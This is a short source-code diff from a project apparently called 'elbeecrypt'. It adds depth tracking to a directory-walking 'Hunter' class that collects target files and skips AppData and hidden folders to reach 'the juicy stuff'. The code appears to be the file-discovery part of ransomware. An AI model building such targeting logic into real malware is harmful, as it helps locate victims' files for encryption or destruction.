@@ -55,10 +55,13 @@ namespace elbeecrypt::common::io {
 	//Private methods
 	/** Impl of hunt(vector<path>). */
 	void Hunter::hunt(const std::vector<fs::path>& roots){
+		//Define the depth for the current directory
+		uint32_t currentDepth = 0;
+
 		//Define the lambda to collect the directory listings
-		auto fileConsumer = [this](const fs::path& path){
+		auto fileConsumer = [this, &currentDepth](const fs::path& path){
 			//Add the target to the list of paths if its targetable (to be determined by subclasses)
-			if(isTargetable(path)) targets.push_back(path);
+			if(isTargetable(path, currentDepth)) targets.push_back(path);
 		};
 
 		//Loop over each root directory
@@ -67,14 +70,14 @@ namespace elbeecrypt::common::io {
 			const int rootPathDepth = common::utils::FS::pathDepth(root);
 
 			//Define the lambda that processes each directory encountered
-			auto folderConsumer = [&rootPathDepth](const fs::path& path){
-				//Get the delta between this path's depth and the depth of the base path
-				int depthDelta = utils::FS::pathDepth(path) - rootPathDepth;
+			auto folderConsumer = [&rootPathDepth, &currentDepth](const fs::path& path){
+				//Get the delta between this path's depth and the depth of the base path and assign it to the current depth
+				currentDepth = utils::FS::pathDepth(path) - rootPathDepth;
 
 				//Skip "." directories and AppData only if the depth is 1 (skipping straight to the juicy stuff)
-				if(depthDelta == 1 && path.filename().string()[0] == '.') return false;
-				if(depthDelta == 1 && utils::String::toLowercase(path.filename().string()) == "appdata") return false;
-				if(depthDelta == 1 && utils::String::toLowercase(path.filename().string()) == "application data") return false;
+				if(currentDepth == 1 && path.filename().string()[0] == '.') return false;
+				if(currentDepth == 1 && utils::String::toLowercase(path.filename().string()) == "appdata") return false;
+				if(currentDepth == 1 && utils::String::toLowercase(path.filename().string()) == "application data") return false;
 
 				//Return true by default, allowing the directory walker to recurse down into that directory
 				return true;
